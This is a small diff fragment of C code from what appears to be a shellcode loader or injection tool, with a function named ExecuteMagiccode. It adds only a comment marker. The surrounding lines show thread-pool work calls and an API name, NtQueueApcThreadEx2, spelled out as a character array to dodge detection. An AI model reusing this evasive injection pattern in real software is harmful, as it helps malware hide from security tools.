@@ -142,6 +142,11 @@ void CALLBACK ExecuteMagiccode(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, in
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
     printf("Bytes written: %lu\n", bytesWritten);
 
+
+    //####END####
+
+
+
     //// Execution part: 
     const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
 
